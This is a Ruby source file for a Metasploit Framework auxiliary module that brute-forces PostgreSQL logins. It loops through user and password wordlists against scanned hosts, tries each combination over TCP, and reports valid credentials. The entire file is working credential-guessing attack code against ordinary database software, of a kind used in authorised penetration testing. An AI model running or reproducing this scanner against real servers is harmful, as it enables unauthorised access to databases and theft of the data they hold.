##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Postgres
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	
	# Creates an instance of this module.
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'PostgreSQL Login Utility',
			'Description'    => %q{
				This module attempts to authenticate against a PostgreSQL
				instance using username and password combinations indicated
				by the USER_FILE, PASS_FILE, and USERPASS_FILE options.
			},
			'Author'         => [ 'todb' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'URL', 'www.postgresql.org' ]
				],
			'Version'        => '$Revision$'
		))

		register_options(
			[
				OptPath.new('USERPASS_FILE',  [ false, "File containing (space-seperated) users and passwords, one pair per line", File.join(Msf::Config.install_root, "data", "wordlists", "postgres_default_userpass.txt") ]),
				OptPath.new('USER_FILE',      [ false, "File containing users, one per line", File.join(Msf::Config.install_root, "data", "wordlists", "postgres_default_user.txt") ]),
				OptPath.new('PASS_FILE',      [ false, "File containing passwords, one per line", File.join(Msf::Config.install_root, "data", "wordlists", "postgres_default_pass.txt") ]),
			], self.class)

		# Users must use user/pass/userpass files.
		deregister_options('USERNAME', 'PASSWORD', 'SQL')
	end

	# Loops through each host in turn. Note the current IP address is both
	# ip and datastore['RHOST']
	def run_host(ip)
		tried_combos = []
		last_response = nil
			each_user_pass { |user, pass|
				# Stash these in the datastore.
				datastore['USERNAME'] = user
				datastore['PASSWORD'] = pass
				# Don't bother if we've already tried this combination, or if the last time
				# we tried we got some kind of connection error. 
				if not(tried_combos.include?("#{user}:#{pass}") || [:done, :error].include?(last_response))
					last_response = do_login(user,pass,datastore['DATABASE'],datastore['VERBOSE'])
				else
					next
				end
				tried_combos << "#{user}:#{pass}"
			}
	end

	# Alias for RHOST
	def rhost
		datastore['RHOST']
	end

	# Alias for RPORT	
	def rport
		datastore['RPORT']
	end

	# Test the connection with Rex::Socket before handing
	# off to Postgres-PR, since Postgres-PR takes forever
	# to return from connection errors. TODO: convert
	# Postgres-PR to use Rex::Socket natively to avoid 
	# this double-connect business.
	def test_connection
		begin
		sock = Rex::Socket::Tcp.create(
			'PeerHost' => rhost,
			'PeerPort' => rport
		)
		rescue Rex::ConnectionError
			print_error "#{rhost}:#{rport} Connection Error: #{$!}" if datastore['VERBOSE']
			raise $!
		end	
	end

	# Actually do all the login stuff. Note that "verbose" is really pretty
	# verbose, since postgres_login also makes use of the verbose value
	# to print diagnostics for other modules.
	def do_login(user=nil,pass=nil,database=nil,verbose=false)
		begin
			test_connection
		rescue Rex::ConnectionError
			return :done
		end
		msg = "#{rhost}:#{rport} Postgres -"
		print_status("#{msg} Trying username:'#{user}' with password:'#{pass}' against #{rhost}:#{rport} on database '#{database}'") if verbose 
		result = postgres_login(
			:db => database,
			:username => user,
			:password => pass
		)
		case result
		when :error_database
			print_good("#{msg} Success: #{user}:#{pass} (Database '#{database}' failed.)")
			return :next_user # This is a success for user:pass!
		when :error_credentials
			print_error("#{msg} Username/Password failed.") if verbose
			return
		when :connected
			print_good("#{msg} Success: #{user}:#{pass} (Database '#{database}' succeeded.)")
			postgres_logout
			return :next_user
		when :error
			print_error("#{msg} Unknown error encountered, quitting.") if verbose
			return :done
		end
	end

end